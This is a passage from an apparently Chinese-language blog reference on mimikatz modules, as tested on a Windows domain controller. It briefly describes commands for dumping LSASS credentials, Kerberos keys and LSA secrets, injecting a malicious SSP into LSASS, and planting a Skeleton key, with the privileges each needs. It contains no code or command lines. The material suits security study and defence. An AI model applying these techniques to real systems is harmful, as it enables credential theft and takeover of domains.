<h5 id="LSADUMP-SECRETS-获取syskey来解密SECRETS条目"><a href="#LSADUMP-SECRETS-获取syskey来解密SECRETS条目" class="headerlink" title="LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目"></a>LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目</h5><p>需要system或者debug权限<br><img src="../img/lsadump.secrets.jpg"></p>
<h5 id="LSADUMP-TRUST-请求LSA-server检索信任身份验证信息"><a href="#LSADUMP-TRUST-请求LSA-server检索信任身份验证信息" class="headerlink" title="LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息"></a>LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息</h5><p>需要system或者debug权限<br>从活动目录中存在的信任关系中提取数据，信任密钥也会显示。</p>
<h3 id="6-MISC"><a href="#6-MISC" class="headerlink" title="6.MISC"></a>6.MISC</h3><p>mimikatz的MISC模块包含了很多不太适合其他一些应用场景的命令，最常用的一些命令是<code>MISC::AddSID, MISC::MemSSP, MISC::Skeleton</code></p>
<h5 id="MISC-ADDSID-（新版本该功能在sid模块下sid-add）"><a href="#MISC-ADDSID-（新版本该功能在sid模块下sid-add）" class="headerlink" title="MISC::ADDSID -（新版本该功能在sid模块下sid::add）"></a>MISC::ADDSID -（新版本该功能在sid模块下sid::add）</h5><p>给账户添加SIDHISTORY，需要system或者debug权限。</p>
<h5 id="MISC-CMD-运行CMD"><a href="#MISC-CMD-运行CMD" class="headerlink" title="MISC::CMD    - 运行CMD"></a>MISC::CMD    - 运行CMD</h5><p>需要管理员权限</p>
<h5 id="MISC-compressme-压缩打包自身"><a href="#MISC-compressme-压缩打包自身" class="headerlink" title="MISC::compressme - 压缩打包自身"></a>MISC::compressme - 压缩打包自身</h5><h5 id="MISC-DETOURS-尝试使用Detours-like-hooks列举所有的模块"><a href="#MISC-DETOURS-尝试使用Detours-like-hooks列举所有的模块" class="headerlink" title="MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块"></a>MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块</h5><p>需要管理员权限<br><img src="../img/misc.detours.jpg"></p>
<h5 id="MISC-MemSSP-通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。"><a href="#MISC-MemSSP-通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。" class="headerlink" title="MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。"></a>MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。</h5><p>需要管理员权限，详细内容请看<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1760">post on Mimikatz SSP describes in-memory patching as well as more persistent SSP techniques</a><br><img src="../img/misc.memssp.jpg"></p>
<h5 id="MISC-ncroutemon-juiper管理器（没有DisableTaskMgr）"><a href="#MISC-ncroutemon-juiper管理器（没有DisableTaskMgr）" class="headerlink" title="MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）"></a>MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）</h5><h5 id="MISC-regedit-打开注册表（没有DisableRegistryTools）"><a href="#MISC-regedit-打开注册表（没有DisableRegistryTools）" class="headerlink" title="MISC::regedit - 打开注册表（没有DisableRegistryTools）"></a>MISC::regedit - 打开注册表（没有DisableRegistryTools）</h5><p>需要管理员权限</p>
<h5 id="MISC-Skeleton-在域控制器上注入一个Sekeleton-key到LSASS进程"><a href="#MISC-Skeleton-在域控制器上注入一个Sekeleton-key到LSASS进程" class="headerlink" title="MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程"></a>MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程</h5><p>需要管理员权限，该操作给DC打补丁，让所有用户可以通过Master password（Skeleton key）和他们常用的密码进行验证<br><img src="../img/misc.skeleton.jpg"></p>
<h5 id="MISC-TASKMGR-打开任务管理器"><a href="#MISC-TASKMGR-打开任务管理器" class="headerlink" title="MISC::TASKMGR - 打开任务管理器"></a>MISC::TASKMGR - 打开任务管理器</h5><p>需要管理员权限</p>
<h3 id="7-MINESWEEPER"><a href="#7-MINESWEEPER" class="headerlink" title="7.MINESWEEPER"></a>7.MINESWEEPER</h3><h5 id="MINESWEEPER-INFOS-提供minesweeper的mine信息"><a href="#MINESWEEPER-INFOS-提供minesweeper的mine信息" class="headerlink" title="MINESWEEPER::INFOS - 提供minesweeper的mine信息"></a>MINESWEEPER::INFOS - 提供minesweeper的mine信息</h5><h3 id="8-NET"><a href="#8-NET" class="headerlink" title="8.NET"></a>8.NET</h3><h5 id="NET-user-列出用户名及所属组"><a href="#NET-user-列出用户名及所属组" class="headerlink" title="NET::user - 列出用户名及所属组"></a>NET::user - 列出用户名及所属组</h5><p><img src="../img/net.user.jpg"></p>
<h5 id="NET-GROUP"><a href="#NET-GROUP" class="headerlink" title="NET::GROUP"></a>NET::GROUP</h5><h5 id="NET-LOCALGROUP"><a href="#NET-LOCALGROUP" class="headerlink" title="NET::LOCALGROUP"></a>NET::LOCALGROUP</h5><h3 id="9-PEIVILEGE"><a href="#9-PEIVILEGE" class="headerlink" title="9.PEIVILEGE"></a>9.PEIVILEGE</h3><h5 id="PRIVILEGE-DEBUG-获得debug权限"><a href="#PRIVILEGE-DEBUG-获得debug权限" class="headerlink" title="PRIVILEGE::DEBUG - 获得debug权限"></a>PRIVILEGE::DEBUG - 获得debug权限</h5><p>debug权限允许用户去调试他们不能访问的进程，比如一个拥有debug权限的用户进程启用token可以调试以local system权限运行的服务</p>
<p>以下命令都需要debug权限</p>
<h5 id="PRIVILEGE-BACKUP-备份一个权限"><a href="#PRIVILEGE-BACKUP-备份一个权限" class="headerlink" title="PRIVILEGE::BACKUP - 备份一个权限"></a>PRIVILEGE::BACKUP - 备份一个权限</h5><h5 id="PRIVILEGE-DRIVER-获得驱动权限"><a href="#PRIVILEGE-DRIVER-获得驱动权限" class="headerlink" title="PRIVILEGE::DRIVER - 获得驱动权限"></a>PRIVILEGE::DRIVER - 获得驱动权限</h5><h5 id="PRIVILEGE-ID-获得ID所对应的权限"><a href="#PRIVILEGE-ID-获得ID所对应的权限" class="headerlink" title="PRIVILEGE::ID - 获得ID所对应的权限"></a>PRIVILEGE::ID - 获得ID所对应的权限</h5><h5 id="PRIVILEGE-NAME-获得NAME所对应的权限"><a href="#PRIVILEGE-NAME-获得NAME所对应的权限" class="headerlink" title="PRIVILEGE::NAME - 获得NAME所对应的权限"></a>PRIVILEGE::NAME - 获得NAME所对应的权限</h5><h5 id="PRIVILEGE-RESTORE-获得restore权限"><a href="#PRIVILEGE-RESTORE-获得restore权限" class="headerlink" title="PRIVILEGE::RESTORE - 获得restore权限"></a>PRIVILEGE::RESTORE - 获得restore权限</h5><h3 id="10-PROCESS"><a href="#10-PROCESS" class="headerlink" title="10.PROCESS"></a>10.PROCESS</h3><p>该模块提供从进程中获取数据和与进程交互的功能</p>
<h5 id="PROCESS-Exports-列出进程"><a href="#PROCESS-Exports-列出进程" class="headerlink" title="PROCESS::Exports - 列出进程"></a>PROCESS::Exports - 列出进程</h5><h5 id="PROCESS-IMPORTS-列出IMPORTS"><a href="#PROCESS-IMPORTS-列出IMPORTS" class="headerlink" title="PROCESS::IMPORTS - 列出IMPORTS"></a>PROCESS::IMPORTS - 列出IMPORTS</h5><h5 id="PROCESS-list-列出正在运行的进程"><a href="#PROCESS-list-列出正在运行的进程" class="headerlink" title="PROCESS::list - 列出正在运行的进程"></a>PROCESS::list - 列出正在运行的进程</h5><p>需要管理员权限</p>
<h5 id="PROCESS-RESUME-恢复一个进程"><a href="#PROCESS-RESUME-恢复一个进程" class="headerlink" title="PROCESS::RESUME - 恢复一个进程"></a>PROCESS::RESUME - 恢复一个进程</h5><h5 id="PROCESS-START-启动一个进程"><a href="#PROCESS-START-启动一个进程" class="headerlink" title="PROCESS::START - 启动一个进程"></a>PROCESS::START - 启动一个进程</h5><h5 id="PROCESS-STOP-停止"><a href="#PROCESS-STOP-停止" class="headerlink" title="PROCESS::STOP - 停止"></a>PROCESS::STOP - 停止</h5><h5 id="PROCESS-SUSPEND-挂起"><a href="#PROCESS-SUSPEND-挂起" class="headerlink" title="PROCESS::SUSPEND - 挂起"></a>PROCESS::SUSPEND - 挂起</h5><h3 id="11-SEKURLSA"><a href="#11-SEKURLSA" class="headerlink" title="11.SEKURLSA"></a>11.SEKURLSA</h3><p>SEKURLSA模块与受保护的内存进行交互，从运行在内存中的LSASS中获取密码，keys，pin以及凭证信息。<br>需要管理员权限，debug权限，或者通过<code>token::elevate</code>提升到system权限。如果运行的是dump下来的lsass进程文件，则不需要提权。</p>
<h5 id="SEKURLSA-BACKUPKEYS-获取首选的备份主密钥"><a href="#SEKURLSA-BACKUPKEYS-获取首选的备份主密钥" class="headerlink" title="SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥"></a>SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥</h5><p><img src="../img/sekurlsa.backupkeys.png"></p>
<h5 id="SEKURLSA-Credman-列出凭证管理器"><a href="#SEKURLSA-Credman-列出凭证管理器" class="headerlink" title="SEKURLSA::Credman - 列出凭证管理器"></a>SEKURLSA::Credman - 列出凭证管理器</h5><p><img src="../img/sekurlsa.credman.png"></p>
<h5 id="SEKURLSA-Dpapi-列出缓存的masterkeys"><a href="#SEKURLSA-Dpapi-列出缓存的masterkeys" class="headerlink" title="SEKURLSA::Dpapi - 列出缓存的masterkeys"></a>SEKURLSA::Dpapi - 列出缓存的masterkeys</h5><p><img src="../img/sekurlsa.dpapi.png"></p>
<h5 id="SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret"><a href="#SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret" class="headerlink" title="SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret"></a>SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret</h5><p><img src="../img/sekurlsa.dpapisystem.png"></p>
<h5 id="SEKURLSA-EKEYS-列出Kerberos加密密钥"><a href="#SEKURLSA-EKEYS-列出Kerberos加密密钥" class="headerlink" title="SEKURLSA::EKEYS - 列出Kerberos加密密钥"></a>SEKURLSA::EKEYS - 列出Kerberos加密密钥</h5><p><img src="../img/sekurlsa.ekeys.png"></p>
<h5 id="SEKURLSA-KERBEROS-列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）"><a href="#SEKURLSA-KERBEROS-列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）" class="headerlink" title="SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）"></a>SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）</h5><p><img src="../img/sekurlsa.kerberos.png"></p>
<h5 id="SEKURLSA-krbtgt-获取域Kerberos服务账号的密码数据"><a href="#SEKURLSA-krbtgt-获取域Kerberos服务账号的密码数据" class="headerlink" title="SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据"></a>SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据</h5><h5 id="SEKURLSA-LiveSSP-列出LiveSSP凭证信息"><a href="#SEKURLSA-LiveSSP-列出LiveSSP凭证信息" class="headerlink" title="SEKURLSA::LiveSSP - 列出LiveSSP凭证信息"></a>SEKURLSA::LiveSSP - 列出LiveSSP凭证信息</h5><h5 id="SEKURLSA-logonpasswords-列出最近登陆过的所有用户的密码信息"><a href="#SEKURLSA-logonpasswords-列出最近登陆过的所有用户的密码信息" class="headerlink" title="SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息"></a>SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息</h5><p>账户密码使用可逆的方式存储在内存中，如果内存中存在密码信息，那么可以被显示出来。（适用于Windows8.1/Windows 2012 R2之前）。KB2871997补丁针对这个安全问题进行了修复，不过仍然需要手动添加额外的配置，需要管理员权限</p>
<h5 id="SEKURLSA-Minidump-切换到LSASS-minidump进程上下文"><a href="#SEKURLSA-Minidump-切换到LSASS-minidump进程上下文" class="headerlink" title="SEKURLSA::Minidump - 切换到LSASS minidump进程上下文"></a>SEKURLSA::Minidump - 切换到LSASS minidump进程上下文</h5><p>需要注意的是minidump是对相同平台上的LSASS数据进行读取，NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64</p>
<h5 id="SEKURLSA-MSV-列出LM-amp-NTLM凭证"><a href="#SEKURLSA-MSV-列出LM-amp-NTLM凭证" class="headerlink" title="SEKURLSA::MSV - 列出LM &amp; NTLM凭证"></a>SEKURLSA::MSV - 列出LM &amp; NTLM凭证</h5>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.</span> <span class="toc-text">mimikatz的一些常用模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9AWindows-2012-R2-%E5%AD%90%E5%9F%9FDC"><span class="toc-number">2.</span> <span class="toc-text">测试环境：Windows 2012 R2 子域DC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CRYPTO%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">1.CRYPTO模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-capi-%E7%BB%99CryptoAPI%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6"><span class="toc-number">3.0.1.</span> <span class="toc-text">crypto::capi 给CryptoAPI打补丁，方便导出证书</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-certificates-%E5%88%97%E5%87%BA-%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6"><span class="toc-number">3.0.2.</span> <span class="toc-text">crypto::certificates 列出&#x2F;导出证书</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-cng-%E7%BB%99CNG%E6%9C%8D%E5%8A%A1%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%AF%BC%E5%87%BA%E8%AF%81%E4%B9%A6%EF%BC%88%E8%A1%A5%E4%B8%81Keylso%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">3.0.3.</span> <span class="toc-text">crypto::cng    给CNG服务打补丁，方便导出证书（补丁Keylso服务）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-hash-%E5%AF%B9%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8CHASH%E6%93%8D%E4%BD%9C"><span class="toc-number">3.0.4.</span> <span class="toc-text">crypto::hash    对密码进行HASH操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-keys-%E5%88%97%E5%87%BA-%E5%AF%BC%E5%87%BA%E5%AF%86%E9%92%A5%E7%9A%84%E5%AE%B9%E5%99%A8"><span class="toc-number">3.0.5.</span> <span class="toc-text">crypto::keys    列出&#x2F;导出密钥的容器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-providers-%E5%88%97%E5%87%BA%E5%8A%A0%E5%AF%86%E6%8F%90%E4%BE%9B%E5%95%86"><span class="toc-number">3.0.6.</span> <span class="toc-text">crypto::providers    列出加密提供商</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-stores-%E5%88%97%E5%87%BA%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.0.7.</span> <span class="toc-text">crypto::stores        列出加密存储类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#crypto-system-%E6%8F%90%E4%BE%9B%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%E6%88%96%E8%80%85%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">3.0.8.</span> <span class="toc-text">crypto:system     提供系统证书文件的路径或者注册表配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DPAPI%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">2.DPAPI模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-EVENT%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">3.EVENT模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-KERBEROS%E6%A8%A1%E5%9D%97"><span class="toc-number">6.</span> <span class="toc-text">4.KERBEROS模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-ASK-%E8%AF%B7%E6%B1%82TGS%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.1.</span> <span class="toc-text">KERBEROS::ASK    请求TGS票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-CLIST-%E5%88%97%E5%87%BA%E5%9C%A8MIT-HEIMDALL%E7%BC%93%E5%AD%98%E4%B8%AD%E7%9A%84%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.2.</span> <span class="toc-text">KERBEROS::CLIST    列出在MIT&#x2F;HEIMDALL缓存中的票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-GOLDEN-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.3.</span> <span class="toc-text">KERBEROS::GOLDEN    创建黄金票据&#x2F;白银票据&#x2F;信任票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.4.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.0.5.</span> <span class="toc-text">白银票据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.</span> <span class="toc-text">信任票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E4%B8%80%E4%B8%AA%E5%86%85%E9%83%A8AD%E6%9E%97%E7%9A%84%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.1.</span> <span class="toc-text">伪造一个内部AD林的信任票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-Hash-%E6%8A%8A%E5%AF%86%E7%A0%81hash%E6%88%90%E5%AF%86%E9%92%A5"><span class="toc-number">6.1.2.</span> <span class="toc-text">KERBEROS::Hash    -    把密码hash成密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-List-%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E4%BF%9D%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE%EF%BC%88TGT-TGS%EF%BC%89%EF%BC%8C%E4%B8%8D%E9%9C%80%E8%A6%81%E7%89%B9%E6%AE%8A%E7%9A%84%E6%9D%83%E9%99%90%E5%9B%A0%E4%B8%BA%E5%8F%AA%E5%88%97%E5%87%BA%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%B0%B1%E5%83%8F%E5%91%BD%E4%BB%A4klist"><span class="toc-number">6.1.3.</span> <span class="toc-text">KERBEROS::List    -    列出所有保存在用户内存中的用户的票据（TGT&#x2F;TGS），不需要特殊的权限因为只列出当前用户的票据，就像命令klist</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PTC-%E4%BC%A0%E9%80%92%E7%BC%93%E5%AD%98%EF%BC%88NT6%EF%BC%89"><span class="toc-number">6.1.4.</span> <span class="toc-text">KERBEROS::PTC        -    传递缓存（NT6）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PTT-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.5.</span> <span class="toc-text">KERBEROS::PTT        -    传递票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-PURGE-%E6%B8%85%E9%99%A4%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89kerberos%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.6.</span> <span class="toc-text">KERBEROS::PURGE    清除当前会话中的所有kerberos票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KERBEROS-TGT-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E7%9A%84TGT"><span class="toc-number">6.1.7.</span> <span class="toc-text">KERBEROS::TGT        获得当前用户的TGT</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LSADUMP"><span class="toc-number">7.</span> <span class="toc-text">5.LSADUMP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-BACKUPKEYS"><span class="toc-number">7.0.1.</span> <span class="toc-text">LSADUMP::BACKUPKEYS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-CACHE-%E8%8E%B7%E5%8F%96Syskey%E7%94%A8%E6%9D%A5%E8%A7%A3%E5%AF%86NL-KM-AND-MSCACHE-V2-%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%88%96%E8%80%85hives%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96"><span class="toc-number">7.0.2.</span> <span class="toc-text">LSADUMP::CACHE    -    获取Syskey用来解密NL$KM AND MSCACHE(V2)(从注册表或者hives文件中获取)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-DCSYNC-%E5%90%91DC%E5%8F%91%E8%B5%B7%E4%B8%80%E4%B8%AA%E5%90%8C%E6%AD%A5%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82-%E8%8E%B7%E5%8F%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE"><span class="toc-number">7.0.3.</span> <span class="toc-text">LSADUMP::DCSYNC    -    向DC发起一个同步对象请求(获取账户密码数据)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#DCSync%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-number">7.0.3.1.</span> <span class="toc-text">DCSync是如何工作的</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-LSA-%E4%BB%8ELSA%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%AF%BC%E5%87%BA%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%AF%BC%E5%87%BA%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">7.0.4.</span> <span class="toc-text">LSADUMP::LSA    -    从LSA服务中导出活动目录中的凭证信息，也可以导出指定用户的凭证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-NETSYNC"><span class="toc-number">7.0.5.</span> <span class="toc-text">LSADUMP::NETSYNC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-RPDATA"><span class="toc-number">7.0.6.</span> <span class="toc-text">LSADUMP::RPDATA</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-SAM-%E8%8E%B7%E5%8F%96sysken%E6%9D%A5%E8%A7%A3%E5%AF%86SAM%EF%BC%88%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%88%96%E8%80%85hive%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96%EF%BC%89%E3%80%82SAM%E4%BC%9A%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88SAM%EF%BC%89%E5%B9%B6%E4%B8%94%E8%BD%AC%E5%AD%98%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81%E3%80%82"><span class="toc-number">7.0.7.</span> <span class="toc-text">LSADUMP::SAM - 获取sysken来解密SAM（从注册表或者hive文件中获取）。SAM会连接到本地安全账户管理数据库（SAM）并且转存本地账户的凭证。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-SECRETS-%E8%8E%B7%E5%8F%96syskey%E6%9D%A5%E8%A7%A3%E5%AF%86SECRETS%E6%9D%A1%E7%9B%AE"><span class="toc-number">7.0.8.</span> <span class="toc-text">LSADUMP::SECRETS    -    获取syskey来解密SECRETS条目</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#LSADUMP-TRUST-%E8%AF%B7%E6%B1%82LSA-server%E6%A3%80%E7%B4%A2%E4%BF%A1%E4%BB%BB%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">7.0.9.</span> <span class="toc-text">LSADUMP::TRUST    -    请求LSA server检索信任身份验证信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-MISC"><span class="toc-number">8.</span> <span class="toc-text">6.MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-ADDSID-%EF%BC%88%E6%96%B0%E7%89%88%E6%9C%AC%E8%AF%A5%E5%8A%9F%E8%83%BD%E5%9C%A8sid%E6%A8%A1%E5%9D%97%E4%B8%8Bsid-add%EF%BC%89"><span class="toc-number">8.0.1.</span> <span class="toc-text">MISC::ADDSID -（新版本该功能在sid模块下sid::add）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-CMD-%E8%BF%90%E8%A1%8CCMD"><span class="toc-number">8.0.2.</span> <span class="toc-text">MISC::CMD    - 运行CMD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-compressme-%E5%8E%8B%E7%BC%A9%E6%89%93%E5%8C%85%E8%87%AA%E8%BA%AB"><span class="toc-number">8.0.3.</span> <span class="toc-text">MISC::compressme - 压缩打包自身</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-DETOURS-%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8Detours-like-hooks%E5%88%97%E4%B8%BE%E6%89%80%E6%9C%89%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-number">8.0.4.</span> <span class="toc-text">MISC::DETOURS - 尝试使用Detours-like hooks列举所有的模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-MemSSP-%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84SSP%E7%BB%99%E5%86%85%E5%AD%98%E9%87%8C%E7%9A%84LSASS%E8%BF%9B%E7%A8%8B%E6%89%93%E8%A1%A5%E4%B8%81%EF%BC%8C%E6%B3%A8%E5%85%A5%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84SSP%E6%9D%A5%E8%AE%B0%E5%BD%95%E6%9C%AC%E5%9C%B0%E7%99%BB%E5%BD%95%E6%8E%88%E6%9D%83%E7%9A%84%E5%87%AD%E8%AF%81%EF%BC%8C%E8%AF%A5%E6%93%8D%E4%BD%9C%E4%B8%8D%E9%9C%80%E8%A6%81%E9%87%8D%E5%90%AF%EF%BC%8C%E9%87%8D%E5%90%AF%E5%90%8E%E4%BC%9A%E6%B8%85%E9%99%A4mimikatz%E6%B3%A8%E5%85%A5%E7%9A%84memssp%E3%80%82"><span class="toc-number">8.0.5.</span> <span class="toc-text">MISC::MemSSP - 通过一个新的SSP给内存里的LSASS进程打补丁，注入一个恶意的SSP来记录本地登录授权的凭证，该操作不需要重启，重启后会清除mimikatz注入的memssp。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 